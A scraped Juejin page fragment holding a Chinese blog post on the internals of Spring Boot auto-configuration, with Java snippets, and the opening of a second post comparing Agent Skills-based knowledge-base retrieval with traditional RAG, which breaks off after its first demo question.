  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:18:49.000Z" title="Tue Feb 03 2026 04:18:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>SpringBoot自动配置的黑魔法：5个你可能不知道的底层原理</strong></h2>
<h2 data-id="heading-1">引言</h2>
<p>SpringBoot的自动配置（Auto-configuration）是其最引人注目的特性之一，它极大地简化了Spring应用的开发流程。许多开发者享受着"开箱即用"的便利，却对其背后的实现机制知之甚少。本文将深入探讨SpringBoot自动配置的五个底层原理，揭示那些隐藏在<code>@EnableAutoConfiguration</code>注解背后的"黑魔法"。通过理解这些机制，你不仅能更好地驾驭SpringBoot，还能在遇到问题时快速定位根源。</p>
<hr/>
<h2 data-id="heading-2">主体内容</h2>
<h3 data-id="heading-3">1. 条件化Bean注册：<code>@Conditional</code>的进化史</h3>
<p>自动配置的核心在于<strong>按需加载</strong>，而这正是通过Spring 4.0引入的条件化机制实现的。</p>
<p><strong>深度解析：</strong></p>
<ul>
<li><code>@ConditionalOnClass</code>的实际工作原理：</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Target({ElementType.TYPE, ElementType.METHOD})</span>
<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-meta">@Documented</span>
<span class="hljs-meta">@Conditional(OnClassCondition.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> ConditionalOnClass {
    Class&lt;?&gt;[] value() <span class="hljs-keyword">default</span> {};
    String[] name() <span class="hljs-keyword">default</span> {};
}
</code></pre>
<p>关键在于<code>OnClassCondition</code>这个实现类，它会在运行时通过<code>ClassNameFilter</code>检查类路径：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> ConditionOutcome[] getOutcomes(String[] autoConfigurationClasses,
        AutoConfigurationMetadata autoConfigurationMetadata) {
    ConditionOutcome[] outcomes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionOutcome</span>[autoConfigurationClasses.length];
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; outcomes.length; i++) {
        <span class="hljs-type">String</span> <span class="hljs-variable">autoConfigurationClass</span> <span class="hljs-operator">=</span> autoConfigurationClasses[i];
        <span class="hljs-keyword">if</span> (autoConfigurationClass != <span class="hljs-literal">null</span>) {
            outcomes[i] = getOutcome(autoConfigurationMetadata.get(autoConfigurationClass, <span class="hljs-string">"ConditionalOnClass"</span>));
        }
    }
    <span class="hljs-keyword">return</span> outcomes;
}
</code></pre>
<p><strong>进阶知识：</strong></p>
<ul>
<li>SpringBoot对条件注解做了性能优化：在应用启动时会将所有auto-configuration类的条件评估结果缓存起来</li>
<li><code>spring-autoconfigure-metadata.properties</code>文件的作用：提前存储条件判断所需元数据，避免反射开销</li>
</ul>
<h3 data-id="heading-4">2. 自动配置的加载机制：超越classpath扫描</h3>
<p>传统的Spring应用依赖组件扫描，而SpringBoot的自动配置采用了更高效的加载方式。</p>
<p><strong>关键流程：</strong></p>
<ol>
<li><code>META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports</code></li>
<li><code>spring.factories</code>中的淘汰机制（SpringBoot 2.7+已弃用）</li>
<li>导入处理器(<code>AutoConfigurationImportSelector</code>)的工作过程：</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> String[] selectImports(AnnotationMetadata annotationMetadata) {
    <span class="hljs-keyword">if</span> (!isEnabled(annotationMetadata)) {
        <span class="hljs-keyword">return</span> NO_IMPORTS;
    }
    <span class="hljs-type">AutoConfigurationEntry</span> <span class="hljs-variable">autoConfigurationEntry</span> <span class="hljs-operator">=</span> getAutoConfigurationEntry(annotationMetadata);
    <span class="hljs-keyword">return</span> StringUtils.toStringArray(autoConfigurationEntry.getConfigurations());
}
</code></pre>
<p><strong>性能优化点：</strong></p>
<ul>
<li>使用<code>AutoConfigurationSorter</code>对配置类进行拓扑排序</li>
<li><code>@AutoConfigureAfter</code>和<code>@AutoConfigureBefore</code>的实现原理</li>
<li>排除机制的双重保障：<code>exclude()</code>属性和条件评估</li>
</ul>
<h3 data-id="heading-5">3. 配置属性的绑定魔法：宽松绑定与类型安全</h3>
<p>从<code>application.properties/yaml</code>到<code>@Bean</code>属性的映射过程比表面看起来更复杂。</p>
<p><strong>类型转换体系：</strong></p>
<ol>
<li><code>Binder.bind()</code>方法的调用链</li>
<li><code>ConversionService</code>的特殊处理逻辑：</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> &lt;T&gt; Object <span class="hljs-title function_">convertValue</span><span class="hljs-params">(BindContext context, Object value, ResolvableType targetType)</span> {
    <span class="hljs-type">ConversionService</span> <span class="hljs-variable">conversionService</span> <span class="hljs-operator">=</span> context.getConversionService();
    <span class="hljs-keyword">if</span> (conversionService.canConvert(value.getClass(), targetType)) {
        <span class="hljs-keyword">return</span> conversionService.convert(value, targetType);
    }
    <span class="hljs-keyword">return</span> value;
}
</code></pre>
<p><strong>高级特性：</strong></p>
<ul>
<li>List/Map的特殊处理规则</li>
<li>Duration等时间类型的智能解析</li>
<li><code>@ConstructorBinding</code>与不可变类的配合使用</li>
<li>Relaxed Binding的实现细节（如将`socket-timeout映射为socketTimeout）</li>
</ul>
<h3 data-id="heading-6">4. SPI扩展点设计："约定优于配置"的工程实践</h3>
<p>SpringBoot大量使用了Java SPI机制来实现可扩展性。</p>
<p><strong>核心扩展接口一览表：</strong></p>

























<table><thead><tr><th>接口</th><th>用途</th><th>典型实现</th></tr></thead><tbody><tr><td><code>ApplicationContextInitializer</code></td><td>上下文初始化</td><td><code>ConditionEvaluationReportLoggingListener</code></td></tr><tr><td><code>ApplicationListener&lt;E&gt;</code></td><td>事件监听</td><td><code>BackgroundPreinitializer</code>, <code>EnvironmentPostProcessorApplicationListener</code></td></tr><tr><td><code>EnvironmentPostProcessor</code></td><td>Environment定制</td><td><code>CloudFoundryVcapEnvironmentPostProcessor</code></td></tr></tbody></table>
<p><strong>自定义扩展实战：</strong>
如何编写自己的自动配置模块：</p>
<ol>
<li>创建/META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports文件</li>
<li>实现典型的条件注解组合：</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@AutoConfigureAfter({DataSourceAutoConfiguration.class})</span>
<span class="hljs-meta">@ConditionalOnClass({JdbcTemplate.class, DataSource.class})</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyCustomAutoConfig</span> {

    <span class="hljs-meta">@Bean</span> 
    <span class="hljs-meta">@ConditionalOnMissingBean</span> 
    <span class="hljs-keyword">public</span> MyCustomComponent <span class="hljs-title function_">myComponent</span><span class="hljs-params">()</span> {...}
}
</code></pre>
<p>###5. Bean后处理的艺术:`BeanPostProcessor'的高级玩法</p>
<p>自动配置中大量使用了Bean后置处理器来实现动态行为。</p>
<p>典型案例分析:
1. ConfigurationPropertiesBindingPostProcessor的属性绑定流程
2. WebServerFactoryCustomizerBeanPostProcessor对嵌入式容器的定制</p>
<p>核心代码片段:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span> 
<span class="hljs-keyword">public</span> Object <span class="hljs-title function_">postProcessBeforeInitialization</span><span class="hljs-params">(Object bean,String beanName)</span>{
<span class="hljs-keyword">if</span>(bean <span class="hljs-keyword">instanceof</span> WebServerFactory webServerFactory){
postProcessWebServerFactory(webServerFactory);}<span class="hljs-keyword">return</span> bean;}
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postProcessWebServerFactory</span><span class="hljs-params">(...)</span>{
<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> customizer:customizers){customizer.customize(factory);}}
</code></pre>
<p>隐藏技巧:
• SmartInitializingSingleton的特殊作用时机
• ImportAware与注入元数据的巧妙结合
• BeanDefinitionRegistryPostProcessor在自动配置中的关键应用</p>
<hr/>
<p>##总结</p>
<p>通过对这五个底层原理的深入剖析我们可以发现 SpringBoot的自动配置绝非简单的"约定优于配詈"。其背后融合了:</p>
<p>1.精细的条件判断系统<br/>
2.高效的资源配置加载机制<br/>
3．强大的属性转换体系<br/>
4．可扩展的SPI架构设计<br/>
5．灵活的Bean生命周期控制</p>
<p>理解这些黑魔法不仅能让我们更好地解决实际开发中遇到的问题更能启发我们设计出更加优雅的系统架构。下次当你的应用神奇地"just work"时不妨思考一下背后这些精妙的工程设计。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[用 Agent Skills 做知识库检索，能比传统 RAG 效果更优吗？]]></title>    <link>https://juejin.cn/post/7602252722373279795</link>    <guid>https://juejin.cn/post/7602252722373279795</guid>    <pubDate>2026-02-03T04:47:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602252722373279795" data-draft-id="7602206323460440115" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="用 Agent Skills 做知识库检索，能比传统 RAG 效果更优吗？"/> <meta itemprop="keywords" content="前端,后端,人工智能"/> <meta itemprop="datePublished" content="2026-02-03T04:47:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ConardLi"/> <meta itemprop="url" content="https://juejin.cn/user/3949101466785709"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            用 Agent Skills 做知识库检索，能比传统 RAG 效果更优吗？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3949101466785709/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ConardLi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:47:53.000Z" title="Tue Feb 03 2026 04:47:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本期视频教程：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RkFAznESD%2F" target="_blank" title="https://www.bilibili.com/video/BV1RkFAznESD/" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1Rk…</a></p>
</blockquote>
<p>使用 Agent Skills 做知识库检索，是一种什么体验？</p>
<p>它能比传统的分块+向量匹配的 RAG 效果更好吗？</p>
<p>大家好，欢迎来到 code秘密花园，我是花园老师，这一期我们进入 Agent Skills 的实战章节。</p>
<h2 data-id="heading-0">基础回顾</h2>
<p>我们上期视频介绍了 Skills 的工作原理和使用方法，我们简单回顾一下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d38d684a449143d0819b76a8a622e543~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=JfJ0ijf8UnqwYkxvG%2BBG2zPVsdE%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>Skills 是最近 Anthropic 推出的一个 Agent 领域的行业标准，它本身就是一个文件夹，里面存放着具体的使用说明（SKILL.md），更详细的参考文档（reference），以及可执行脚本（script）。</p>
</blockquote>
<p>它的核心特性就是渐进式加载策略：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3b823eebd564278892f1d241ba2e7e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=nTPEElLoLptozv8ZgpFb9n7NL84%3D" alt="" loading="lazy"/></p>
<ul>
<li>在 Agent 启动时，仅将所有 Skills 的基本描述加入 AI 的上下文</li>
<li>当用户发出需求时，AI 会根据 Skill 的描述判断具体要调用哪个 Skill</li>
<li>决定后再去读取这个 Skill 的使用说明（SKILL.md）</li>
<li>然后再根据使用说明进一步读取更详细的参考文档，以及决定是否执行某个脚本来连接外部世界</li>
</ul>
<p>通过这样的模式，可以让 Agent 既能节省大量的上下文，又能够精准响应用户需求找到并执行某个技能。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c790c943a22445b0a5d48861467ed681~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=SZI0rVcGMYo7%2BGO%2Bc3T%2Fmhyanb8%3D" alt="" loading="lazy"/></p>
<p>Skills 的使用也非常简单，你只需要把它的文件夹放到特定 Agent 的目录下（如 .claude/skills），AI 就会在下次启动时识别到这个 Skill，并根据用户需求判断是否调用。</p>
<p>下面，我们来实战探索一下，Skill 有哪些有意思的玩法。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dc33f13fdaab4e45b8b3ceccbcaf5015~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=6r6SR7kGbYgXAS9NQYDAP5vqfGI%3D" alt="" loading="lazy"/></p>
<p>熟悉我的粉丝都知道，我本人对传统的通过 Chunk + Embedding 这种实现 RAG 的模式有比较大的偏见。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a509df7b1d6940bd9024dc7cc72926d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=DCWLIB7vTlRBkF3Iv2530F0tV3o%3D" alt="" loading="lazy"/></p>
<p>虽然这种模式最终也能调教出比较好的结果，但调优过程实在是太痛苦了，我是真正经历过毒打的才会有这种感觉。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/900867ce1b744c52a16bab6844d044ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=ge2mdvdNgrfAZQAdhL7IpHG3HJg%3D" alt="" loading="lazy"/></p>
<p>相信很多同学也感同身受，所以我一直感觉这种方案只是当下的一种妥协模式，终究会被时代淘汰的。</p>
<p>最近 LlamaIndex 创始人 Jerry Liu 发表的 Twitter 刚好比较符合我的观点：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31a6f70956ab4d1c95de2964465b18b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=JORqBJMsbIHZXn00WsfpzfSlngQ%3D" alt="" loading="lazy"/></p>
<p>RAG / 检索本身没死，但死的是固定 Chunk + Embedding 那套模式。如果 Agent 可以动态地扩展文件周围的上下文，那么过度考虑数据块大小就没有意义了。</p>
<h2 data-id="heading-1">预期目标</h2>
<p>想象 Agent Skills 的渐进式批漏策略，是不是有点这个意思呢。</p>
<p>所以，我们考虑用 Skills 的设计模式，来实现一个专用于知识检索的 Skill，我期望它能帮我解决下面的问题：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c564a27c617042c293ef28d08f15e5ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=9Wv0zxvTEYU0wJNlvLaOFx8cYoE%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>在指定目录里检索你关心的问题</strong>：比如：「从公司内部知识库里找出最近三年的销售趋势结论」「从某个项目资料里找出所有性能优化建议」。</li>
<li><strong>跨多种文件格式联合查询</strong>：能根据文件类型选择合适的方式来读取和理解，比如 Markdown、PDF、Excel 等，不需要你操心「这份资料是什么格式」。</li>
<li><strong>避免「暴力打开整库」</strong>：不能一上来就把所有文件全部读进来，而是像人一样：先按关键词缩小范围，再精准打开少量相关文件，快速定位答案。</li>
<li><strong>按问题来组织结果</strong>：不能简单地给你一堆「命中行」，而是结合上下文，把和问题相关的内容拼在一起，尽量给出一条可读的、成段的回答。</li>
<li><strong>在复杂问题上做多轮查找</strong>：比如你问的是「对某个政策的关键影响」，它可能先在目录里锁定几份核心 PDF，再在这些 PDF 里按章节检索，再结合结果总结回答。</li>
</ul>
<h2 data-id="heading-2">效果演示</h2>
<p>下面，我们先来演示下效果，我们先创建一个示例知识库，其中包含下面这些数据：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55a42cfc28104117ae8ea8590fd8ec09~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=dnRLZbhFFU%2Fez5UY9T%2BWjGLz9RQ%3D" alt="" loading="lazy"/></p>
<p>知识库包含四个不同领域的知识，包含 markdown、pdf、excel 等多种文件类型：</p>
<ul>
<li>Financial Report Data：金融与上市公司财报类数据，主要是按公司和季度划分的 PDF 报告。</li>
<li>E-commerce Data：电商业务相关的数据文件，如员工、客户、库存和订单等结构化数据。</li>
<li>Safety Knowledge：安全相关知识与文档，涵盖常见 Web 安全漏洞及防护方案。</li>
<li>AI Knowledge：AI 行业与技术相关报告与研究资料，用于检索 AI 技术发展、应用场景及治理趋势。</li>
</ul>
<p>我们先问一个金融领域具体的数据问题：</p>
<blockquote>
<p>检索知识库：三一重工前三大股东？</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2aeb0c172cc44eec9bf33c7d5fef5436~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=22yjCiKJzrqpwvDWTeoMvUF4A24%3D" alt="" loading="lazy"/></p>
<p>这个数据存储在三一重工的 Q3 财报内：</p>
